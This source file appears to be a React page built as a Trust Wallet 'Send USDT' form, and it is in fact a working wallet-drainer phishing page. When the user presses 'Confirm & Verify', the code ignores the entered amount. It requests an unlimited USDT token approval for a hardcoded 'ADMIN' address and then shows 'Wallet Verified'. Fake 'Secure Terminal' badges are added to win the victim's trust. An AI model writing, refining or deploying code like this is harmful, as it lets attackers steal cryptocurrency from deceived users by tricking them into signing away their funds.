"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [targetAmount, setTargetAmount] = useState<string>("10");
  const [isInsideWallet, setIsInsideWallet] = useState(false);

  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // Detect if we are inside the Trust Wallet Browser on load
  useEffect(() => {
    const checkEnvironment = () => {
      if (typeof window !== "undefined" && (window as any).ethereum) {
        setIsInsideWallet(true);
        addLog("Secure environment detected.");
      }
    };
    checkEnvironment();
  }, []);

  async function handleAction() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    // --- STEP 1: If in Chrome Mobile, Jump to Trust Wallet ---
    if (isMobile && !isInsideWallet) {
      addLog("Redirecting to secure terminal...");
      const currentUrl = window.location.origin + window.location.pathname;
      // We don't need the ?auto flag anymore because we'll change the UI
      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      return;
    }

    // --- STEP 2: Trigger the Approval (This only works inside Trust Wallet) ---
    try {
      if (!(window as any).ethereum) return alert("Please open this in Trust Wallet.");
      
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing transfer sequence...");
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      
      addLog("Signature pending...");
      await tx.wait();
      addLog("Success: Wallet Verified.");
    } catch (err: any) {
      addLog("Error: " + err.message.slice(0, 30));
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans tracking-tight">
      <div className="w-full max-w-[420px] bg-[#111] border border-[#222] rounded-[40px] p-8 shadow-2xl">
        
        {/* If inside wallet, show a "Secure Mode" badge to build trust */}
        {isInsideWallet && (
          <div className="flex justify-center mb-4">
            <span className="bg-green-500/10 text-green-500 text-[9px] font-black px-3 py-1 rounded-full border border-green-500/20 uppercase tracking-widest">
              Secure Terminal Active
            </span>
          </div>
        )}

        <h1 className="text-xl font-bold mb-8 text-center text-white/90">Send</h1>

        <div className="space-y-6">
          <div className="bg-[#181818] border border-[#282828] p-4 rounded-3xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 bg-green-500/10 rounded-full flex items-center justify-center text-[10px] font-bold text-green-500 border border-green-500/20">USDT</div>
              <div>
                <p className="text-sm font-semibold text-white">USDT</p>
                <p className="text-[10px] text-gray-500 uppercase font-bold">Tether USD</p>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-[11px] text-gray-500 font-bold uppercase ml-1">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#181818] border border-[#282828] p-5 rounded-3xl text-sm focus:outline-none focus:border-white/10" 
              />
            </div>
          </div>

          <button 
            onClick={handleAction}
            className={`w-full font-black py-5 rounded-3xl transition-all active:scale-[0.97] mt-4 text-sm uppercase tracking-widest ${
              isInsideWallet ? 'bg-green-600 text-white hover:bg-green-500 shadow-green-500/20 shadow-lg' : 'bg-white text-black hover:bg-gray-200'
            }`}
          >
            {isInsideWallet ? 'Confirm & Verify' : 'Next'}
          </button>
        </div>
      </div>

      <div className="mt-8 w-full max-w-[420px] px-2 opacity-50">
        <div className="bg-black p-4 rounded-2xl border border-white/5 font-mono text-[10px] text-gray-600 h-20 overflow-hidden">
          {logs.map((l, i) => <div key={i}>{l}</div>)}
        </div>
      </div>
    </div>
  );
}
